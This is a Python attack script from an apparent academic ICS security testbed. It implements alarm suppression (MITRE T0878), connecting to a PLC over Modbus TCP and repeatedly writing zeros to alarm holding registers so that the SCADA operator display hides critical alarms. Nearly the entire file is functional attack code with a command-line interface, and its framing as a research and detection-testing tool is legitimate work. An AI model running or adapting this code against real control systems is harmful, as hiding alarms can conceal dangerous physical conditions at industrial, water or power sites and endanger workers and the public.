#!/usr/bin/env python3
"""
ASCEND-PG attacks/alarm_suppression.py

MITRE ATT&CK for ICS: T0878 — Alarm Suppression.

Suppresses PLC alarms by writing zero values to alarm-related holding
registers. This prevents the SCADA HMI from displaying critical alarms
even when dangerous conditions exist. In sustained mode, the attack
continuously overrides any alarm self-recovery.

Similar to the Maroochy Water Breach where the attacker suppressed
alarm reporting to the central computer.

PPO Parameters Used:
  - target_ip: PLC whose alarms to suppress
  - register_address: Alarm register base address (40050-40099)
  - value_magnitude: Number of alarm registers to suppress (10-50)

Detection: Suricata detects alarm register writes (SID 9000029).

Run this ON THE ATTACKER HOST:
    python3 attacks/alarm_suppression.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
MODBUS_PORT = 502

# Alarm register range: 40050-40099 (50 registers)
ALARM_REG_BASE = 40050
ALARM_REG_COUNT = 50


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def suppress_alarms(client: ModbusTcpClient, base_addr: int,
                    count: int, log_path: Path) -> dict:
    """Write zero values to alarm registers to suppress alarms."""
    result = {
        "registers_written": 0,
        "values": [],
    }

    print(f"[alarm_supp] Suppressing {count} alarm registers starting at {base_addr}")

    for i in range(count):
        addr = base_addr + i
        # Write zero to suppress alarm
        resp = client.write_register(addr, 0, unit=1)
        if resp.isError():
            print(f"[alarm_supp] Write error at {addr}: {resp}")
            continue

        result["registers_written"] += 1
        result["values"].append({"address": addr, "value": 0})

        log_event(log_path, {
            "stage": "attack", "technique": "T0878",
            "action": "alarm_suppress_write",
            "target": client.host,
            "register": addr,
            "value": 0,
        })

    return result


def run_alarm_suppression(target_ip: str, base_address: int,
                          suppress_count: int, duration: float,
                          interval: float, log_path: Path) -> dict:
    """Run alarm suppression attack against target PLC."""
    print(f"[alarm_supp] Targeting {target_ip}")
    print(f"[alarm_supp] Alarm registers: {base_address}-{base_address + suppress_count - 1}")
    print(f"[alarm_supp] Duration: {duration}s, interval: {interval}s")

    log_event(log_path, {
        "stage": "attack", "technique": "T0878",
        "action": "alarm_suppression_start",
        "target": target_ip,
        "base_address": base_address,
        "suppress_count": suppress_count,
        "duration": duration,
    })

    client = ModbusTcpClient(target_ip, port=MODBUS_PORT, timeout=3)
    total_writes = 0

    try:
        if not client.connect():
            print(f"[alarm_supp] Cannot connect to {target_ip}")
            return {"total_writes": 0, "success": False}

        start_time = time.time()
        cycle = 0

        while time.time() - start_time < duration:
            cycle += 1
            result = suppress_alarms(client, base_address, suppress_count, log_path)
            total_writes += result["registers_written"]

            print(f"[alarm_supp] Cycle {cycle}: {result['registers_written']}/{suppress_count} "
                  f"registers zeroed (total: {total_writes})")

            if interval > 0 and time.time() - start_time + interval < duration:
                time.sleep(interval)

    except Exception as exc:
        print(f"[alarm_supp] Error: {exc}")
    finally:
        client.close()

    success = total_writes > 0
    log_event(log_path, {
        "stage": "attack", "technique": "T0878",
        "action": "alarm_suppression_end",
        "target": target_ip,
        "total_writes": total_writes,
        "success": success,
    })

    return {"total_writes": total_writes, "success": success}


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Alarm Suppression (T0878) — zero out alarm "
                    "registers to prevent SCADA alarm display"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP")
    parser.add_argument("-a", "--register-address", type=int, default=40050,
                        help="Alarm register base address (default: 40050)")
    parser.add_argument("-v", "--value-magnitude", type=float, default=1.0,
                        help="Suppress count multiplier: 1.0=10, 1.5=15, 2.0=20 (default: 1.0)")
    parser.add_argument("-d", "--duration", type=float, default=5.0,
                        help="Attack duration in seconds (default: 5)")
    parser.add_argument("-i", "--interval", type=float, default=1.0,
                        help="Interval between cycles in seconds (default: 1.0)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    # Calculate suppress count based on value_magnitude
    suppress_count = int(10 * args.value_magnitude)

    run_alarm_suppression(
        args.target, args.register_address,
        suppress_count, args.duration,
        args.interval, log_path
    )

    print(f"\n[alarm_supp] Done")


if __name__ == "__main__":
    main()
